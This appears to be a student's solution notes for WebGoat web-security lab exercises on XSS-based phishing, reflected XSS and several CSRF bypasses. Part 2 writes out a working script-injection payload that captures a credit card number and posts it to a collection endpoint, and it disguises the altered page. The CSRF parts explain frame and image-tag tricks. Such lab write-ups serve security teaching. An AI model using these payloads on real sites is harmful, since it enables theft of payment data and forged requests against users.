part 1 Explanation:
Phishing with XSS
A form was used to collect user's information. When the user click the button, post the info to target URL.

part 2 Explanation:
Reflected XSS Attacks
The three digit access code input is exploitable.
Readable version of the URL
http://localhost:8090/WebGoat/start.mvc#attack/752417971/900?input1=000&input2=
<script>
    var btn = document.getElementsByName("buy")[0];
    btn.addEventListener('click', function () { steal(); }, false);
    function steal() {
        $.ajax({ type: "POST", url: "catcher?PROPERTY=yes&stolen-credit-card=" + document.getElementsByName("input1")[0].value, });
    }
    document.getElementsByName("input2")[0].value = "000";
    document.getElementById("message").style.display = "none";
</script>
Explanation:Add an event listener to the Purchase button. When the user click the button, post the credit card number to target URL. Using DOM operation to change the input2 value so that we can make the page with the injected script looks as close as the original page

part 3 Explanation:
Cross Site Request Forgery (CSRF)
The message is exploitable. We can put the url inside an image element.


Part 4 Explanation:
CSRF Prompt By-Pass
Using two image element to fetch the target url. The first image uses to start the transfer and the second image uses to confirm the transfer.

Part 5 Explanation:
CSRF Token By-Pass
The message is exploitable. We can use a frame to get the token first and then use another frame to start the transfer with the token.